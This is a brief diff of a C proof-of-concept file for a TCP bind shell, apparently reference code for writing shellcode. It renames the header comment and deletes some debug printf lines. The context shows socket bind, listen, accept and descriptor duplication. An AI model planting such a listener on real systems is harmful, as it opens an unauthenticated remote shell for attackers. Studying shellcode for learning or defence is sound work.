@@ -1,5 +1,5 @@
 /*
- * tcp_bind_shellcode_light_poc.c: binds on a given TCP port and spawn a shell
+ * tcp_bind_shellcode_poc.c: binds on a given TCP port and spawn a shell
  * on incoming connections. 
  *
  * BSD 2-Clause License
@@ -37,9 +37,6 @@ int main(int argc, char **argv) {
 	bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
 	listen(sfd, 0);
-	printf("%d\n", sizeof(struct sockaddr));
-	printf("%d\n", sizeof(socklen_t));
-	printf("%d\n", sizeof(int));
 	cfd = accept4(sfd, NULL, NULL, 0);
 
 	dup2(cfd, 0);
